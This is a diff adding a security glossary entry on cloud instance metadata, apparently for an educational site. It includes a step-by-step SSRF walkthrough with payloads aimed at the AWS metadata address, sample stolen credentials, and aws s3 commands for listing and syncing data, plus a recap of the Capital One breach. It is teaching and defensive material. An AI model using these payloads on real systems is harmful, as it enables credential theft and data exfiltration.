@@ -1,0 +1,201 @@
+---
+slug: "metadata"
+term: "Metadata"
+abbreviation: ""
+shortDefinition: "Data that describes other data. In cloud computing, it's configuration information about instances including temporary credentials."
+category: "Cloud Security"
+tags: ["metadata", "cloud", "imds", "aws", "credentials"]
+relatedTerms: ["imds", "cloud-infrastructure", "credentials", "ssrf"]
+language: "en"
+hasTranslation: true
+translationSlug: "metadata"
+difficulty: "intermediate"
+lastUpdated: "2026-02-26"
+sources:
+  - "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html"
+---
+
+## Short Definition
+Metadata is "data about data." In the cloud, it's info about your server: its ID, network settings, and crucially, temporary passwords (credentials) to access other services. Problem: accessible at a well-known address attackers love to target.
+
+## Full Definition
+In general computing, metadata describes characteristics of data. In cloud security context, it specifically refers to instance metadata provided by cloud platforms.
+
+**Cloud Instance Metadata includes:**
+
+**Identity information:**
+- Instance ID
+- Account ID
+- Region/Availability zone
+- Instance type
+
+**Network configuration:**
+- Private IP address
+- Public IP address
+- Security groups
+- MAC address
+
+**IAM credentials:**
+- Access key ID
+- Secret access key
+- Session token
+- Expiration time
+
+**User data:**
+- Bootstrap scripts
+- Configuration files
+- Sometimes contains secrets
+
+**How to access (AWS example):**
+```bash
+# Get instance ID
+curl http://169.254.169.254/latest/meta-data/instance-id
+
+# Get IAM role credentials
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
+```
+
+## Why It Matters
+- Essential for cloud instances to function
+- Contains highly sensitive credentials
+- Primary target in SSRF attacks
+- Credentials valid for hours
+- Standard address across all instances
+
+## How Attackers Use It
+**SSRF attack to steal metadata:**
+
+1. **Find vulnerable endpoint:**
+```python
+# Application fetches images from URLs
+POST /fetch-image
+{"url": "http://example.com/pic.jpg"}
+```
+
+2. **Request metadata instead:**
+```python
+{"url": "http://169.254.169.254/latest/meta-data/"}
+```
+
+3. **Server responds with metadata:**
+```
+ami-id
+ami-launch-index
+iam/
+instance-id
+...
+```
+
+4. **Get credentials:**
+```python
+{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/WebAppRole"}
+```
+
+5. **Returns:**
+```json
+{
+  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  "Token": "very-long-session-token...",
+  "Expiration": "2026-02-27T12:00:00Z"
+}
+```
+
+6. **Use credentials:**
+```bash
+aws s3 ls --access-key ASIA... --secret-key wJal...
+# Now has access to all S3 buckets the role permits
+```
+
+## How to Detect or Prevent It
+**Prevention:**
+
+**Use IMDSv2:**
+```bash
+# IMDSv2 requires token first
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+
+# Then use token in header
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
+```
+
+SSRF attacks can't easily replicate PUT request + custom header.
+
+**Network restrictions:**
+```bash
+# Set hop limit to 1 (prevents forwarding)
+aws ec2 modify-instance-metadata-options \
+    --instance-id i-1234567890abcdef0 \
+    --http-put-response-hop-limit 1
+```
+
+**IAM role restrictions:**
+- Apply least privilege
+- Limit what metadata credentials can access
+- Use resource-based policies
+
+**Application-level:**
+- Block 169.254.169.254 in outbound requests
+- Validate URLs before fetching
+- Use allowlists for external requests
+
+**Detection:**
+- Monitor metadata endpoint access
+- Alert on unusual access patterns
+- Track credential usage by source
+- Log all API calls made with metadata credentials
+
+## Common Misconceptions
+- "Metadata is just technical info" - Contains full credentials
+- "Can't access from outside" - SSRF bypasses this
+- "Metadata changes require restart" - Dynamic, updates automatically
+- "Blocking IP is enough" - Can use DNS name in some clouds
+- "IMDSv2 completely prevents SSRF" - Helps significantly but not 100%
+
+## Real-World Example
+**Capital One Breach - Metadata Exploitation**
+
+**Step-by-step:**
+
+1. **Vulnerable WAF accepted URLs**
+
+2. **Attacker probed:**
+```
+http://169.254.169.254/
+→ Got response!
+```
+
+3. **Listed IAM roles:**
+```
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+→ Response: ISRM-WAF-Role
+```
+
+4. **Retrieved credentials:**
+```
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role
+→ Full AWS credentials returned
+```
+
+5. **Used credentials to list S3:**
+```bash
+aws s3 ls --profile stolen-creds
+→ 700+ buckets visible
+```
+
+6. **Downloaded sensitive data:**
+```bash
+aws s3 sync s3://bucket-with-customer-data ./
+→ 100M+ customer records
+```
+
+**Why it worked:**
+- IMDSv1 (no authentication required)
+- WAF role over-permissioned
+- No monitoring for unusual metadata access
+- No validation on URL fetching
+
+**Cost:** $230M+ in fines and remediation
+
+## Related Terms
+IMDS, Cloud Infrastructure, Credentials, SSRF, Access Key
